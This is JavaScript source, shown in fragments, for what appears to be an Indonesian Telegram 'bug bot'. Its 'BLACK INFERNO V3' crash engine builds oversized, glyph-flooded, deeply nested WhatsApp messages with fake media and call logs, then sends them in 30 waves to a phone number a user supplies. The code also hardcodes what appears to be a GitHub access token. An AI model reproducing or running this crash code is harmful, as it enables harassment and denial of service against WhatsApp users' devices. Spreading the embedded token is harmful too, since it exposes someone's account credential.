...
const repo_gh = "adjiepangestu-ux/XINSOOGLOBAL";
const nama_file = "db.json";
const path_ghp = "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";
...
// ============================================================
// ========== BLACK INFERNO V3 - ULTIMATE CRASH ENGINE ==========
// ============================================================
async function crashandro(client, X, ptcp = true) {
    try {
        const cards = [];
        for (let i = 0; i < 30; i++) {
            cards.push({
                header: {
                    title: "𒐫𒐬𒐭𒐮𒐯".repeat(500),
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/fake_inferno.enc",
                        mimetype: "image/jpeg",
                        ...
                        directPath: `/v/t62.7118-24/fake_${Date.now()}.enc`,
                        ...
                        scansSidecar: crypto.randomBytes(32).toString("base64"),
                        scanLengths: [3537, 10557, 1905, 2353],
                        midQualityFileSha256: crypto.randomBytes(32).toString("base64")
                    }
                },
                body: {
                    text: "𒐫𒐬𒐭𒐮𒐯".repeat(1000) + "𒑰𒑱𒑲𒑳".repeat(1000) + "𖤐𖤑𖤒".repeat(1000)
                },
                footer: {
                    text: "☠️".repeat(3000)
                },
                nativeFlowMessage: {
                    messageParamsJson: JSON.stringify({
                        nested: {
                            level1: "X".repeat(5000),
                            level2: {
                                level3: "Y".repeat(5000),
                                level4: {
                                    level5: "Z".repeat(5000),
                                    array: Array(200).fill().map(() => ({
                                        payload: "💀".repeat(1000)
                                    }))
                                }
                            }
        ...
        const mainMsg = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                        ...
                        footer: {
                            text: "⚡ SYSTEM MELTDOWN ⚡".repeat(500)
                        },
                        header: {
                            hasMediaAttachment: true,
                            videoMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7161-24/fake_inferno_vid.enc",
                                mimetype: "video/mp4",
                                fileSha256: crypto.randomBytes(32).toString("base64"),
                                fileLength: "999999999999",
                                seconds: 999,
                                mediaKey: crypto.randomBytes(32).toString("base64"),
                                caption: "𒐫".repeat(5000),
                                height: 99999,
                                width: 99999,
                                fileEncSha256: crypto.randomBytes(32).toString("base64"),
                                directPath: `/v/t62.7161-24/fake_vid_${Date.now()}.enc`,
                                mediaKeyTimestamp: Date.now().toString(),
                                streamingSidecar: crypto.randomBytes(32).toString("base64"),
                                thumbnailDirectPath: `/v/t62.36147-24/fake_thumb_${Date.now()}.enc`,
                        ...
                        contextInfo: {
                            ...
                            isForwarded: true,
                            stanzaId: crypto.randomBytes(16).toString("hex").toUpperCase(),
                            ...
                            quotedMessage: {
                                ...
                                callLogMessage: {
                                    ...
                                    durationSecs: "999999",
                                    callType: "REGULAR",
                                    participants: Array.from({ length: 500 }, () => ({
                                        jid: `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`,
                                        callOutcome: "1"
                                    }))
                                }
                            },
        ...
        await client.relayMessage(X, {
            ...
            messageId: mainMsg.key.id,
            participant: { jid: X }
        } : { messageId: mainMsg.key.id });

        await client.relayMessage("status@broadcast", mainMsg.message, {
            messageId: mainMsg.key.id + "_status",
            statusJidList: [X],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    ...
                    content: Array.from({ length: 100 }, () => ({
                        tag: "to",
                        attrs: { jid: `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net` }
                    }))
                }]
            }]
        });
            ...
            await client.relayMessage(X, {
                sendPaymentMessage: {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "INFERNO".repeat(100),
                                mediaType: "VIDEO",
                                jpegThumbnail: "",
                                caption: "💀".repeat(5000)
                            }
        ...
        console.error("BLACK_INFERNO_V3 error:", e);
        return false;
    }
}
  ...
  try {
    ...
    if (
      ...
      const keyboard = new InlineKeyboard()
        ...
        .row()
        .url("📱 Follow Wahatsapp", "https://whatsapp.com/channel/0029VbCat6q0QeaoXXhat20p")
        .row()
        .url("📷 Follow Instagram", "https://www.instagram.com/xzeso13")
        .row()
        .url("🎥 Subscribe Youtube", "https://www.youtube.com/@Xzesobugbot");
  ...
  .url("CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesoandro lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                ...
                "Gunakan format:\n" +
                "<code>/Xzesoandro 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoandro 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "👀 ćhannal",
                            url: "https://t.me/Xzesoinc13",
                        },
                        {
                            text: "👤 owner ",
                            url: "https://t.me/Xzeso13",
                        },
                    ],
                ],
            },
...
case "Droidx": {
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Droidx lagi.`,
                { parse_mode: "Markdown" }
            );
        }
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Betaxzeso lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Betaxzeso 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoandro 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
    ...
    try {
        ...
        await ctx.reply(
            `<b>🔥 BLACK INFERNO V3</b>\n` +
            `☄ Target: <code>${cleanTarget}</code>\n` +
            `⚡ Status: <code>Executing 30 waves...</code>`,
            { parse_mode: "HTML" }
        );

        (async () => {
            for (let z = 0; z < 30; z++) {
                await crashandro(client, X, true);
                await new Promise(resolve => setImmediate(resolve));
            }
        })();

    } catch (e) {
        log.error(`INFERNO ERROR: ${e.message}`);
        await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
    break;
}
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Delayxzeso lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Delayxzeso 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Delayxzeso 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Betaxzosex lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Betaxzosex 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Betaxzosex 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesoiosx lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Xzesoiosx 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesoiosx 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /invisisendx lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/invisisendx 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/invisisendx 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
    ...
    try {
        ...
        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /Xzesox lagi.`,
                { parse_mode: "Markdown" }
            );
        }
        ...
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/Xzesox 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/Xzesox 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }
